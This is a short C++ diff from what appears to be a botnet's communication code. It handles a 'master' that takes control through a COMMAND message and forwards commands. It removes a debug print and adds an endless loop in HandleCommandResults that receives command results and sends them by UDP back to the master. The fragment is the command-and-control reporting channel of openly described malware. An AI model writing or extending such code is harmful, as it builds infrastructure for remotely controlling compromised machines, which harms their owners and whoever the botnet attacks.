@@ -140,7 +140,6 @@ void Communication::HandleIncomingsUDP()
 		case COMMAND: //when the master takes control
 			master = client;
 			send_command((u_char*)buf, BOTNET_PACK_SIZE);
-			printf("sent");
 			break;
 		case VERSION_SYNC_REQUEST: //when someone asks from you to give him information.
 			break;
@@ -201,9 +200,11 @@ void Communication::HandleIncomingsTCP()
 void Communication::HandleCommandResults()
 {
 	IPC_INIT();
-	
+	uint8_t buf[900];
+
 	while (1)
 	{
-
+		recv_result(buf, 900);
+		sendto(udp_sock, (char*)buf, 900, 0, (struct sockaddr*)&master, sizeof(master));
 	}
 }
